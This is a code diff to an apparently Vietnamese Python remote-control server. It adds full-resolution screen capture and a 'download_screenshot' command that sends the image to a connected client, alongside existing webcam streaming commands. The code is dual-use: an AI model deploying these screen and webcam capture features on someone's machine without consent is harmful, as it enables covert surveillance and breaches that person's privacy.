@@ -141,6 +141,22 @@ def take_screenshot():
         return f"[OK] Screenshot saved: {filename}"
     except Exception as e: return f"[ERROR] {e}"
 
+# --- HÀM MỚI: CHỤP ẢNH GỐC ĐỂ GỬI FILE (KHÔNG RESIZE) ---
+def capture_full_quality_bytes():
+    try:
+        img = ImageGrab.grab()
+        img = img.convert("RGB") # Sửa lỗi RGBA
+        
+        # Không resize (thumbnail) để giữ nguyên độ nét
+        img_byte_arr = io.BytesIO()
+        
+        # Lưu chất lượng cao nhất (JPEG 100)
+        img.save(img_byte_arr, format='JPEG', quality=100)
+        return img_byte_arr.getvalue()
+    except Exception as e:
+        print(f"[ERROR] High-res capture: {e}")
+        return None
+
 def record_webcam(seconds):
     # LƯU Ý: Khi dùng Global Camera, hàm này cần mượn frame từ global
     # thay vì mở lại VideoCapture(0) (sẽ gây lỗi conflict thiết bị)
@@ -219,6 +235,12 @@ def handle_client(conn, addr):
             img_data = capture_screen_bytes()
             send_image_data(conn, img_data)
             return
+
+        elif command == "download_screenshot":
+            # Lấy ảnh gốc chất lượng cao
+            img_data = capture_full_quality_bytes()
+            send_image_data(conn, img_data)
+            return # Gửi xong đóng kết nối luôn
 
         elif command == "webcam_stream":
             img_data = capture_webcam_bytes()
